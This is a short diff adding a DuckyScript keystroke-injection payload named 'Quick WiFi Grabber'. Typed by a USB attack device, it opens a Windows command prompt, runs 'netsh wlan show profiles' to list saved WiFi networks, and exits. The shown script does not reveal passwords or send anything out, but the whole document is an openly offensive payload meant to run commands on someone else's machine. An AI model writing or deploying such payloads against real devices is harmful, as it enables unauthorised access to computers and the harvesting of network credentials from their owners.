@@ -1,0 +1,12 @@
+REM Quick WiFi Grabber
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh wlan show profiles
+ENTER
+DELAY 1000
+STRING exit
+ENTER
